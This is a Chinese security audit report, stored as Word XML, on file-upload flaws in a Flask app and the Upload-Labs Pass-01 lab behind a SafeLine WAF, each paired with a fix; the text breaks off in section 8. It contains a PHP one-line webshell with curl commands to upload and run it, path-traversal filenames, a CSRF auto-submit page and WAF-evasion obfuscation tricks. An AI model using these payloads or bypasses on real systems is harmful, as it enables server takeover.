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48"/>
        </w:rPr>
        <w:t>文件上传漏洞检测与修复报告</w:t>
        <w:br/>
        <w:t>Upload-Labs Pass-01 实战分析</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>检测日期：2026年07月09日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一、概述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>二、文件上传漏洞攻击面分析</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>三、漏洞1：路径穿越漏洞</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>四、漏洞2：任意文件上传漏洞</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>五、漏洞3：文件重名覆盖漏洞</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>六、漏洞4：CSRF 漏洞</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>七、漏洞5：WAF 绕过测试记录</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>八、Upload-Labs Pass-01 实战绕过记录</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>九、修复方案汇总</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>十、安全建议</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>一、概述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测试项目</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Flask 用户管理系统 + Upload-Labs Pass-01</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>测试框架</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Python Flask + SQLite</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>前端 WAF</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>长亭雷池 SafeLine 社区版</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>后端服务器</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Apache + PHP 5 (Windows)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>漏洞数量</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>5 项（含 WAF 绕过测试）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curl, Burp Suite</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>文件上传漏洞是 OWASP Top 10 中常见的 Web 安全风险。本报告针对 Flask 用户管理系统的头像上传功能进行安全审计，并记录了 Upload-Labs Pass-01 关卡在长亭雷池 WAF 防护下的绕过测试过程。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>二、文件上传漏洞攻击面分析</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.1 攻击面总览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攻击面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利用方式</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>路径穿越</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>上传文件到任意目录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../../shell.php-&gt;覆盖系统文件</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>任意后缀</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>上传可执行文件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上传.php反弹shell</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>重名覆盖</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>覆盖已有文件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覆盖index.php.jsp</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>CSRF</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>跨站上传文件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诱导用户上传恶意文件</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>文件内容</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>WAF内容检测绕过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base64编码/变量拼接等</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.2 攻击链</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>步骤1：登录系统获取 Session</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>步骤2：构造恶意文件（含PHP代码的图片马）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>步骤3：绕过客户端 JS 校验（直接发送 POST 请求）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>步骤4：绕过服务端扩展名校验（修改 Content-Disposition）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>步骤5：绕过 WAF 内容检测（编码/混淆/变量拼接）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>步骤6：上传成功后访问文件，触发代码执行</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>三、漏洞1：路径穿越漏洞</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>严重程度：🔴 致命</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.1 漏洞描述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>上传功能直接使用用户提供的原始文件名，未做任何安全处理。攻击者可在文件名中插入 ../ 路径穿越符，将文件保存到服务器任意目录。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.2 漏洞代码（修复前）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># app.py 修复前 - 无任何防护</w:t>
        <w:br/>
        <w:t>@app.route("/upload", methods=["GET", "POST"])</w:t>
        <w:br/>
        <w:t>@login_required</w:t>
        <w:br/>
        <w:t>def upload():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    file = request.files.get("file")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if file and file.filename:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        filename = file.filename       # ← 直接使用原始文件名！</w:t>
        <w:br/>
        <w:t xml:space="preserve">        upload_path = os.path.join("static", "uploads", filename)</w:t>
        <w:br/>
        <w:t xml:space="preserve">        file.save(upload_path)          # ← 保存到任意路径！</w:t>
        <w:br/>
        <w:t xml:space="preserve">        ...</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.3 攻击场景</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>使用 Burp Suite 拦截上传请求，修改 filename 参数：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>原始请求：</w:t>
        <w:br/>
        <w:t>Content-Disposition: form-data; name="file"; filename="avatar.jpg"</w:t>
        <w:br/>
        <w:t>→ 文件保存到: static/uploads/avatar.jpg ✅ 安全</w:t>
        <w:br/>
        <w:br/>
        <w:t>恶意请求：</w:t>
        <w:br/>
        <w:t>Content-Disposition: form-data; name="file"; filename="../../templates/index.html"</w:t>
        <w:br/>
        <w:t>→ 文件保存到: templates/index.html ❌ 覆盖模板文件！</w:t>
        <w:br/>
        <w:br/>
        <w:t>更严重的攻击：</w:t>
        <w:br/>
        <w:t>filename="../../app.py"</w:t>
        <w:br/>
        <w:t>→ 覆盖 app.py，植入恶意代码！</w:t>
        <w:br/>
        <w:br/>
        <w:t>filename="../../.bashrc"</w:t>
        <w:br/>
        <w:t>→ 覆盖用户配置文件，反弹 Shell！</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.4 修复方案</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>使用 os.path.basename() 提取纯文件名，移除所有路径信息：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>def safe_filename(filename):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    # 第一步：只保留文件名，移除路径</w:t>
        <w:br/>
        <w:t xml:space="preserve">    filename = os.path.basename(filename)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    # 第二步：移除空字节</w:t>
        <w:br/>
        <w:t xml:space="preserve">    filename = filename.replace("\x00", "")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    # 第三步：检查扩展名白名单</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ext = os.path.splitext(filename)[1].lower()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if ext not in ALLOWED_EXTENSIONS:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return None</w:t>
        <w:br/>
        <w:t xml:space="preserve">    # 第四步：只保留安全字符</w:t>
        <w:br/>
        <w:t xml:space="preserve">    safe_name = re.sub(r"[^\w\.\-]", "_", filename)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if not safe_name or safe_name.startswith("."):</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return None</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return safe_name</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>四、漏洞2：任意文件上传漏洞</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>严重程度：🟠 高危</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.1 漏洞描述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>修复前系统不对上传文件的扩展名做任何校验，攻击者可上传 .php、.py、.exe、.sh 等可执行文件到服务器，结合路径穿越漏洞可直接获取服务器权限。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.2 攻击场景</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>上传 PHP Webshell 到服务器：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># 创建 PHP 一句话木马</w:t>
        <w:br/>
        <w:t>echo '&lt;?php @eval($_POST["cmd"]);?&gt;' &gt; shell.php</w:t>
        <w:br/>
        <w:br/>
        <w:t># 上传到服务器</w:t>
        <w:br/>
        <w:t>curl http://target/upload -F "file=@shell.php"</w:t>
        <w:br/>
        <w:br/>
        <w:t># 访问 webshell 执行命令</w:t>
        <w:br/>
        <w:t>curl http://target/static/uploads/shell.php -d "cmd=system('whoami');"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.3 修复方案</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>白名单校验：仅允许图片格式扩展名</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># 只允许的扩展名</w:t>
        <w:br/>
        <w:t>ALLOWED_EXTENSIONS = {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ".jpg", ".jpeg", ".png", ".gif",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ".bmp", ".webp", ".svg"</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:br/>
        <w:t>if ext not in ALLOWED_EXTENSIONS:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return None  # 拒绝上传</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>五、漏洞3：文件重名覆盖漏洞</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>严重程度：🟡 中危</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.1 漏洞描述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>不同用户上传同名文件时，后上传的文件会直接覆盖先上传的文件，导致文件丢失。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.2 修复方案</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>自动检测重名并添加序号：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>base, ext = os.path.splitext(upload_path)</w:t>
        <w:br/>
        <w:t>counter = 1</w:t>
        <w:br/>
        <w:t>while os.path.exists(upload_path):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    upload_path = f"{base}_{counter}{ext}"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    filename = f"{base_name}_{counter}{ext}"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    counter += 1</w:t>
        <w:br/>
        <w:t>file.save(upload_path)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>六、漏洞4：CSRF 漏洞</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>严重程度：🟠 高危</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6.1 漏洞描述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>上传表单没有 CSRF Token 保护，攻击者可构造恶意页面诱导已登录用户自动提交上传表单，上传恶意文件。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6.2 攻击场景</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>攻击者构造以下 HTML 页面，诱骗已登录的用户访问：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;html&gt;</w:t>
        <w:br/>
        <w:t>&lt;body&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;h1&gt;免费领取红包！&lt;/h1&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;!-- 隐藏的跨站上传表单 --&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;form id="csrf_form" method="POST"</w:t>
        <w:br/>
        <w:t xml:space="preserve">        enctype="multipart/form-data"</w:t>
        <w:br/>
        <w:t xml:space="preserve">        action="http://target/upload"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;input type="file" name="file"</w:t>
        <w:br/>
        <w:t xml:space="preserve">           value="shell.php" hidden&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;/form&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;script&gt;document.getElementById('csrf_form').submit();&lt;/script&gt;</w:t>
        <w:br/>
        <w:t>&lt;/body&gt;</w:t>
        <w:br/>
        <w:t>&lt;/html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6.3 修复方案</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>添加 CSRF Token 机制：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># 生成 Token</w:t>
        <w:br/>
        <w:t>def generate_csrf_token():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if "_csrf_token" not in session:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        session["_csrf_token"] = secrets.token_hex(16)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return session["_csrf_token"]</w:t>
        <w:br/>
        <w:br/>
        <w:t># 验证 Token</w:t>
        <w:br/>
        <w:t>def validate_csrf_token(token):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    stored = session.get("_csrf_token")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return secrets.compare_digest(stored, token)</w:t>
        <w:br/>
        <w:br/>
        <w:t># 模板中添加隐藏字段</w:t>
        <w:br/>
        <w:t>&lt;input type="hidden" name="csrf_token"</w:t>
        <w:br/>
        <w:t xml:space="preserve">       value="{{ csrf_token() }}"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>七、漏洞5：WAF 内容检测绕过测试</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>严重程度：🟡 中危</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7.1 WAF 规则探测结果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&lt;?php $a=1;?&gt; (变量赋值)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纯变量赋值不过WAF</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>&lt;?=1?&gt; (短标签)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允许简单输出</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>$a="_PO"."ST" (拼接)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字符串拼接绕过关键词</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>$$a (变量变量)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  <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>间接访问超全局变量</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>eval($_POST[0]) (函数调用)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>❌ 拦截</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>任何()都被拦截</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>echo/print (输出函数)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>❌ 拦截</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>输出函数被拦截</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>include/require (文件包含)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>❌ 拦截</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>文件包含被拦截</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>$_POST/$_GET (超全局变量)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>❌ 拦截</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>超全局变量名被拦截</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7.2 WAF 绕过成功的技术</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>技术1：字符串拼接构建函数名</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>"e"."v"."a"."l"  → 拼接为 "eval"  → WAF未拦截单个字符串</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>技术2：变量变量间接访问超全局变量</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>$a="_PO"."ST"; $$a  → 访问 $_POST → WAF未检测到$_POST字样</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>技术3：白名单扩展名 + 纯变量内容</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>.jpg 扩展名 + &lt;?php $a=1;?&gt;  → WAF放行（但服务端黑名单拦截）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>八、Upload-Labs Pass-01 实战绕过记录</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.1 靶场环境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靶场</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>upload-labs Pass-01 (js前端校验)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>WAF</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>长亭雷池 SafeLine 社区版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Windows + PHP 5 + Apache</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
